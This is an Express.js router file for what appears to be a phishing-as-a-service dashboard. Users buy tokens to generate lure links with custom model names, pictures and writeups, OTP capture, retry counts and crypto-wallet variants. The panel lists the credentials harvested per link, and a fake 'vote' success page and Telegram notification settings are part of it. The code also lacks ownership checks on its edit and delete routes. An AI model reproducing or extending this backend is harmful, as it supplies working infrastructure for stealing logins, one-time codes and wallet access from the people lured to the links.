const router = require("express").Router();
const { linkTypes, templates, walletTypes } = require("../constants");
const Links = require("../models/LinkModel");
const Credentials = require("../models/CredentialModel");
const { ensureAuthenticated } = require("../config/auth");
const ShortUniqueId = require("short-unique-id");
const User = require("../models/User");
const bcrypt = require("bcryptjs");
const moment = require("moment");
const WalletLink = require("../models/WalletLink");
const bot = require("../telegram");
const { blockURL } = require("../middlewares/blockUrl");


router.get("/", blockURL, async (req, res) => {
    try {
        console.log(req.hostname)
        return res.render("index", { req, layout: "layout" });
    } catch (err) {
        console.log(err)
        return res.redirect("/notfound");
    }
});

router.get("/dashboard", ensureAuthenticated, async (req, res) => {
    try {
        const credentials = await Credentials.find({ user: req.user.id }).limit(10);
        const links = await Links.find({ user: req.user.id }).limit(10);

        const walletlinkscount = await WalletLink.find({ user: req.user.id }).count();
        const linkscount = await Links.find({ user: req.user.id }).count();
        const credentialscount = await Credentials.find({ user: req.user.id }).count();

        return res.render("dashboard", { req, credentials, moment, walletlinkscount, credentialscount, linkscount, links, layout: "layout2" });
    } catch (err) {
        console.log(err)
        return res.redirect("/notfound");
    }
});

router.get("/pricing", ensureAuthenticated, async (req, res) => {
    return res.render("pricing", { moment, req, layout: "layout2" });
});


router.get("/pricing2", ensureAuthenticated, async (req, res) => {
    return res.render("pricing2", { moment, req, layout: "layout2" });
});

// CREDENTIALS
router.get("/credentials", ensureAuthenticated, async (req, res) => {
    const credentials = await Credentials.find({ user: req.user.id });
    return res.render("credentials", { credentials, moment, req, layout: "layout2" });
});

// LINKS START
router.get("/links", ensureAuthenticated, async (req, res) => {
    const links = await Links.find({ user: req.user.id });
    return res.render("Links", { links, moment, req, layout: "layout2" });
});

router.get("/wallet-links", ensureAuthenticated, async (req, res) => {
    const links = await WalletLink.find({ user: req.user.id });
    return res.render("walletLinks", { links, moment, req, layout: "layout2" });
});

router.get("/links/edit/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Links.findById(id);
        if (link) {
            return res.render("editLink", { link, req, layout: "layout2" });
        } else {
            res.redirect("/404");
        }
    } catch (err) {
        console.log(err);
        res.redirect("/notfound");
    }
});

router.post("/links/edit/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        const link = await Links.findById(id);
        if (link) {
            await Links.updateOne({ _id: id }, {
                ...req.body
            })
            req.flash("success_msg", "Link updated successfully");
            return res.redirect(`/links/edit/${link._id}`);
        } else {
            req.flash("error_msg", "Sorry something went wrong");
            return res.redirect(`/links/edit/${link._id}`);
        }
    } catch (err) {
        console.log(err);
        res.redirect("/notfound");
    }
});

router.post("/links/edit/renew/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { duration } = req.body;
        const { id } = req.params;
        const link = await Links.findById(id);
        if (link) {

            if (link.usLink && (req.user.usTokens < duration)) {
                req.flash("error_msg", "Insufficient USA tokens");
                return res.redirect(`/links/edit/${link._id}`);
            }

            if (!link.usLink && (req.user.tokens < duration)) {
                req.flash("error_msg", "Insufficient tokens");
                return res.redirect(`/links/edit/${link._id}`);
            }

            let newDate = new Date();
            let expiry = new Date(link.expiry);

            if (newDate > expiry) {
                newDate.setDate(newDate.getDate() + (Math.abs(duration) * 7));
            }
            else {
                newDate = newDate.setDate(expiry.getDate() + (Math.abs(duration) * 7));
            }

            await Links.updateOne({ _id: id }, {
                expiry: newDate
            });

            await User.updateOne({ _id: req.user.id }, {
                tokens: !link.usLink ? Math.abs(req.user.tokens) - duration : Math.abs(req.user.tokens),
                usTokens: link.usLink ? Math.abs(req.user.usTokens) - duration : Math.abs(req.user.usTokens)
            });

            req.flash("success_msg", "Link renewed successfully");
            return res.redirect(`/links/edit/${link._id}`);
        } else {
            req.flash("error_msg", "Sorry something went wrong");
            return res.redirect(`/links/edit/${link._id}`);
        }
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});


router.get("/create-link", ensureAuthenticated, (req, res) => {
    try {
        return res.render("createLink", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/create-link2", ensureAuthenticated, (req, res) => {
    try {
        return res.render("createLink2", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/create-link3", ensureAuthenticated, (req, res) => {
    try {
        return res.render("createLink3", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/create-link", ensureAuthenticated, async (req, res) => {
    try {
        const {
            name,
            linkType,
            modelName,
            otpEnabled,
            numberOfRetries,
            duration,
            usLink
        } = req.body;

        if (!linkTypes.includes(linkType) || !modelName || !name || !duration || !numberOfRetries) {
            req.flash("error_msg", "Fill all fields correctly");
            return res.redirect("/create-link");
        }

        if (usLink == 'true' && (req.user.usTokens < Math.abs(duration))) {
            req.flash("error_msg", "Insufficient USA tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        if (usLink == 'false' && (req.user.tokens < Math.abs(duration))) {
            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        const uid = new ShortUniqueId({ length: 20 });
        const uniqueID = uid.rnd();
        const currentDate = new Date();
        const newDate = new Date(currentDate);
        newDate.setDate(currentDate.getDate() + (Math.abs(duration) * 7));
        const newLink = new Links({
            linkType,
            name: name.trim(),
            modelName: modelName.trim(),
            otpEnabled,
            numberOfRetries,
            usLink,
            link: uniqueID,
            user: req.user.id,
            expiry: newDate
        });
        await newLink.save();
        await User.updateOne({ 
            username: req.user.username 
        }, { 
            tokens: usLink == 'false' ? req.user.tokens - Math.abs(duration) : Math.abs(req.user.tokens),
            usTokens: usLink == 'true' ? req.user.usTokens - Math.abs(duration) : Math.abs(req.user.usTokens), 
        });
        req.flash("success_msg", "Link generated successfully!");
        return res.redirect(`/successful-link/${uniqueID}?retry=${numberOfRetries}`);
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/create-link2", ensureAuthenticated, async (req, res) => {
    try {
        const {
            name,
            linkType,
            modelName,
            otpEnabled,
            numberOfRetries,
            picture,
            duration,
            usLink
        } = req.body;

        if (!linkTypes.includes(linkType) || !modelName || !name || !picture || !duration) {
            req.flash("error_msg", "Fill all fields correctly");
            return res.redirect("/create-link");
        }

        if (usLink == 'true' && (req.user.usTokens < Math.abs(duration))) {
            req.flash("error_msg", "Insufficient USA tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        if (usLink == 'false' && (req.user.tokens < Math.abs(duration))) {
            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        const uid = new ShortUniqueId({ length: 20 });
        const uniqueID = modelName.split(" ").join("-").toLowerCase() + "-" + uid.rnd();

        const currentDate = new Date();
        const newDate = new Date(currentDate);
        newDate.setDate(currentDate.getDate() + (Math.abs(duration) * 7));
        const newLink = new Links({
            linkType,
            name: name.trim(),
            modelName: modelName.trim(),
            otpEnabled,
            numberOfRetries,
            picture,
            usLink,
            link: uniqueID,
            user: req.user.id,
            expiry: newDate
        });
        await newLink.save();
        await User.updateOne({ 
            username: req.user.username 
        }, { 
            tokens: usLink == 'false' ? req.user.tokens - Math.abs(duration) : Math.abs(req.user.tokens),
            usTokens: usLink == 'true' ? req.user.usTokens - Math.abs(duration) : Math.abs(req.user.usTokens), 
        });
        return res.redirect(`/successful-link2/${uniqueID}?retry=${numberOfRetries}`);
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/create-link3", ensureAuthenticated, async (req, res) => {
    try {
        const {
            name,
            linkType,
            modelName,
            otpEnabled,
            numberOfRetries,
            picture,
            backgroundPicture,
            writeup,
            buttonText,
            duration,
            usLink
        } = req.body;

        if (!linkTypes.includes(linkType) || !modelName || !backgroundPicture || !writeup || !buttonText || !name || !picture || !duration) {
            req.flash("error_msg", "Fill all fields correctly");
            return res.redirect("/create-link3");
        }

        if (usLink == 'true' && (req.user.usTokens < Math.abs(duration))) {
            req.flash("error_msg", "Insufficient USA tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        if (usLink == 'false' && (req.user.tokens < Math.abs(duration))) {
            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        const uid = new ShortUniqueId({ length: 20 });
        const uniqueID = uid.rnd();

        const currentDate = new Date();
        const newDate = new Date(currentDate);
        newDate.setDate(currentDate.getDate() + (Math.abs(duration) * 7));
        const newLink = new Links({
            linkType,
            name: name.trim(),
            modelName: modelName.trim(),
            otpEnabled,
            numberOfRetries,
            picture,
            usLink,
            backgroundPicture,
            writeup,
            buttonText,
            link: uniqueID,
            user: req.user.id,
            expiry: newDate
        });
        await newLink.save();
        req.flash("success_msg", "Link generated successfully!");
        await User.updateOne({ 
            username: req.user.username 
        }, { 
            tokens: usLink == 'false' ? req.user.tokens - Math.abs(duration) : Math.abs(req.user.tokens),
            usTokens: usLink == 'true' ? req.user.usTokens - Math.abs(duration) : Math.abs(req.user.usTokens), 
        });
        return res.redirect(`/successful-link3/${uniqueID}?retry=${numberOfRetries}`);
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/create-wallet-link", ensureAuthenticated, (req, res) => {
    try {
        return res.render("walletLink", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/create-wallet-link", ensureAuthenticated, async (req, res) => {
    try {
        const {
            name,
            linkType,
            months
        } = req.body;

        if (!walletTypes.includes(linkType) || !months || !name) {
            req.flash("error_msg", "Fill all fields correctly");
            return res.redirect("/create-link");
        }

        const price = Math.abs(months) * 8;

        if (req.user.tokens < price) {
            req.flash("error_msg", "Insufficient tokens, purchase tokens to continue");
            return res.redirect("/create-link");
        }

        const uid = new ShortUniqueId({ length: 20 });
        const uid2 = new ShortUniqueId({ length: 20 });
        const uniqueID = uid2.rnd() + "-" + uid.rnd();

        const currentDate = new Date();
        const newDate = new Date(currentDate);
        newDate.setDate(currentDate.getDate() + ((30) * months));

        const newLink = new WalletLink({
            linkType,
            name: name.trim(),
            shortID: uniqueID,
            user: req.user.id,
            expiry: newDate
        });
        await newLink.save();
        await User.updateOne({ username: req.user.username }, { tokens: req.user.tokens - price });
        req.flash("success_msg", "Link generated successfully!");
        return res.redirect(`/successful-wallet-link/${uniqueID}`);
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link2/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink2", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link3/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink3", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link4/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successfulLink4", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link5/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successFullLink5", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-link6:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const link = await Links.findOne({ link: id });
        return res.render("successFullLink6", { req, id, moment, link, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-wallet-link/:id", ensureAuthenticated, async (req, res) => {
    try {
        const id = req.params.id;
        const walletLink = await WalletLink.findOne({ shortID: id });
        return res.render("successfulWalletLink", { req, id, moment, walletLink, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/successful-vote", async (req, res) => {
    try {
        return res.render("voted", { req, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/delete-link/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.deleteOne({ _id: id });
        await Credentials.deleteMany({ link: id });
        req.flash("success_msg", "Link and credentials deleted successfully");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/disable-otp/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.updateOne({ _id: id }, { otpEnabled: false });
        req.flash("success_msg", "OTP disabled successfully");
        res.redirect("/links");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.get("/enable-otp/:id", ensureAuthenticated, async (req, res) => {
    try {
        const { id } = req.params;
        await Links.updateOne({ _id: id }, { otpEnabled: true });
        req.flash("success_msg", "OTP enabled successfully");
        res.redirect("/links");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

// LINKS END
router.get("/settings", ensureAuthenticated, (req, res) => {
    try {
        return res.render("settings", { req, layout: "layout2" });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/update-telegram", ensureAuthenticated, async (req, res) => {
    try {
        const {
            telegramID
        } = req.body;
        await User.updateOne({ _id: req.user.id }, {
            telegramID
        });
        req.flash("success_msg", "Telegram ID updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/update-notification", ensureAuthenticated, async (req, res) => {
    try {
        const {
            notification
        } = req.body;
        await User.updateOne({ _id: req.user.id }, {
            notification
        });
        req.flash("success_msg", "Notification seetings updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});

router.post("/update-password", ensureAuthenticated, async (req, res) => {
    try {
        const {
            password
        } = req.body;

        if (password.length < 6) {
            req.flash("error_msg", "Password is too short");
            return res.redirect("/settings");
        }

        const salt = await bcrypt.genSalt();
        const hash = await bcrypt.hash(password, salt);

        await User.updateOne({ _id: req.user.id }, {
            password: hash
        });
        req.flash("success_msg", "Password updated successfully");
        return res.redirect("/settings");
    } catch (err) {
        console.log(err);
        return res.redirect("/found");
    }
});

// share token
// LINKS END

router.get("/notfound", (req, res) => {
    try {
        return res.render("notfound", { req, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/notfound");
    }
});


module.exports = router;